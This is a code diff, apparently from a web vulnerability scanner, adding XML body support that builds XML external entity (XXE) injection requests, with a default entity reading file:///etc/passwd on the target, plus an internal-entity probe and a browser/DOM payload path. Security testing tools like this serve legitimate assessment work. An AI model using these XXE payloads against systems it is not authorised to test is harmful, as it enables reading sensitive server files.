@@ -8,6 +8,7 @@ import (
 	"mime/multipart"
 	"net/http"
 	"net/url"
+	"regexp"
 	"sort"
 	"strings"
 
@@ -64,11 +65,25 @@ func build(job types.Job, inject bool) (RequestSpec, error) {
 		return buildForm(job, inject)
 	case "JSON_BODY", "API_ENDPOINT":
 		return buildJSON(job, inject)
+	case "XML_BODY":
+		return buildXML(job, inject)
 	case "FILE_UPLOAD":
 		return buildMultipart(job, inject)
+	case "BROWSER":
+		return buildBrowser(job)
 	default:
 		return buildQuery(job, inject)
 	}
+}
+
+// buildBrowser fetches the page unchanged. The DOM harness applies the payload
+// in the browser, because hash, cookie, storage and postMessage never reach the server.
+func buildBrowser(job types.Job) (RequestSpec, error) {
+	return RequestSpec{
+		Method:  firstNonEmpty(job.Vector.Method, http.MethodGet),
+		URL:     job.Vector.Route,
+		Headers: cloneHeaders(job.Vector.Headers),
+	}, nil
 }
 
 func buildQuery(job types.Job, inject bool) (RequestSpec, error) {
@@ -243,7 +258,9 @@ func buildJSON(job types.Job, inject bool) (RequestSpec, error) {
 	payload := map[string]any{}
 	if job.Vector.Body != "" {
 		if err := json.Unmarshal([]byte(job.Vector.Body), &payload); err != nil {
-			return RequestSpec{}, fmt.Errorf("invalid json body: %w", err)
+			// Recorded bodies are sometimes XML or form data mislabeled as JSON.
+			// Drop the template and probe the discovered fields instead of failing the job.
+			payload = map[string]any{}
 		}
 	}
 	for key, val := range job.Vector.Params {
@@ -309,6 +326,193 @@ func buildMultipart(job types.Job, inject bool) (RequestSpec, error) {
 		Headers: headers,
 		Body:    buf.String(),
 	}, nil
+}
+
+var xxeSystemPattern = regexp.MustCompile(`(?i)SYSTEM\s+"([^"]+)"`)
+
+func buildXML(job types.Job, inject bool) (RequestSpec, error) {
+	headers := cloneHeaders(job.Vector.Headers)
+	headers["Content-Type"] = "application/xml"
+	body := job.Payload.Value
+	if len(job.Vector.Params) > 0 {
+		body = wrapParamsAsXML(job.Vector.Params, job.Payload.Value, inject, injectKey(job, firstParamKey(job.Vector.Params)), job.Vector.XMLRoot)
+	}
+	return RequestSpec{
+		Method:  firstNonEmpty(job.Vector.Method, http.MethodPost),
+		URL:     job.Vector.Route,
+		Headers: headers,
+		Body:    body,
+	}, nil
+}
+
+func wrapParamsAsXML(params map[string]string, payload string, inject bool, key string, root string) string {
+	system := "file:///etc/passwd"
+	if match := xxeSystemPattern.FindStringSubmatch(payload); len(match) == 2 && match[1] != "" {
+		system = match[1]
+	}
+	names := make([]string, 0, len(params))
+	for name := range params {
+		names = append(names, name)
+	}
+	sort.Strings(names)
+
+	root = xmlName(root)
+	if root == "field" {
+		root = "data"
+	}
+
+	var buf strings.Builder
+	if inject {
+		buf.WriteString(`<?xml version="1.0"?><!DOCTYPE `)
+		buf.WriteString(root)
+		buf.WriteString(` [<!ENTITY xxe SYSTEM "`)
+		buf.WriteString(xmlEscape(system))
+		buf.WriteString(`">]>`)
+	} else {
+		buf.WriteString(`<?xml version="1.0"?>`)
+	}
+	buf.WriteString("<")
+	buf.WriteString(root)
+	buf.WriteString(">")
+	for _, name := range names {
+		value := params[name]
+		if inject && name == key {
+			value = "&xxe;"
+		} else {
+			value = xmlEscape(value)
+		}
+		buf.WriteString("<")
+		buf.WriteString(xmlName(name))
+		buf.WriteString(">")
+		buf.WriteString(value)
+		buf.WriteString("</")
+		buf.WriteString(xmlName(name))
+		buf.WriteString(">")
+	}
+	buf.WriteString("</")
+	buf.WriteString(root)
+	buf.WriteString(">")
+	return buf.String()
+}
+
+// BuildXMLProbe rebuilds the discovered XML document with one field replaced.
+// internalEntity declares that value as an internal entity and references it,
+// so a parser that expands entities behaves like the literal value.
+func BuildXMLProbe(job types.Job, key, value string, internalEntity bool) (RequestSpec, error) {
+	key = strings.TrimSpace(key)
+	if key == "" {
+		return RequestSpec{}, fmt.Errorf("xml probe key is empty")
+	}
+	params := cloneParams(job.Vector.Params)
+	if params == nil {
+		params = map[string]string{}
+	}
+	job.Vector.Params = params
+	job.ParamKey = key
+	if internalEntity {
+		return buildXMLInternal(job, value)
+	}
+	params[key] = value
+	return buildXML(job, false)
+}
+
+func buildXMLInternal(job types.Job, entityValue string) (RequestSpec, error) {
+	headers := cloneHeaders(job.Vector.Headers)
+	headers["Content-Type"] = "application/xml"
+	return RequestSpec{
+		Method:  firstNonEmpty(job.Vector.Method, http.MethodPost),
+		URL:     job.Vector.Route,
+		Headers: headers,
+		Body:    wrapInternalEntity(job.Vector.Params, job.ParamKey, entityValue, job.Vector.XMLRoot),
+	}, nil
+}
+
+func wrapInternalEntity(params map[string]string, key, entityValue, root string) string {
+	if _, ok := params[key]; !ok {
+		params[key] = ""
+	}
+	names := make([]string, 0, len(params))
+	for name := range params {
+		names = append(names, name)
+	}
+	sort.Strings(names)
+
+	root = xmlName(root)
+	if root == "field" {
+		root = "data"
+	}
+
+	var buf strings.Builder
+	buf.WriteString(`<?xml version="1.0"?><!DOCTYPE `)
+	buf.WriteString(root)
+	buf.WriteString(` [<!ENTITY xxe "`)
+	buf.WriteString(xmlEscape(entityValue))
+	buf.WriteString(`">]><`)
+	buf.WriteString(root)
+	buf.WriteString(">")
+	for _, name := range names {
+		value := xmlEscape(params[name])
+		if name == key {
+			value = "&xxe;"
+		}
+		buf.WriteString("<")
+		buf.WriteString(xmlName(name))
+		buf.WriteString(">")
+		buf.WriteString(value)
+		buf.WriteString("</")
+		buf.WriteString(xmlName(name))
+		buf.WriteString(">")
+	}
+	buf.WriteString("</")
+	buf.WriteString(root)
+	buf.WriteString(">")
+	return buf.String()
+}
+
+func cloneParams(params map[string]string) map[string]string {
+	if len(params) == 0 {
+		return nil
+	}
+	out := make(map[string]string, len(params))
+	for key, value := range params {
+		out[key] = value
+	}
+	return out
+}
+
+func xmlEscape(value string) string {
+	replacer := strings.NewReplacer(
+		"&", "&amp;",
+		"<", "&lt;",
+		">", "&gt;",
+		`"`, "&quot;",
+	)
+	return replacer.Replace(value)
+}
+
+func xmlName(name string) string {
+	var buf strings.Builder
+	for _, r := range name {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '-' {
+			buf.WriteRune(r)
+		}
+	}
+	if buf.Len() == 0 {
+		return "field"
+	}
+	return buf.String()
+}
+
+func firstParamKey(params map[string]string) string {
+	if len(params) == 0 {
+		return ""
+	}
+	keys := make([]string, 0, len(params))
+	for key := range params {
+		keys = append(keys, key)
+	}
+	sort.Strings(keys)
+	return keys[0]
 }
 
 func injectKey(job types.Job, fallback string) string {
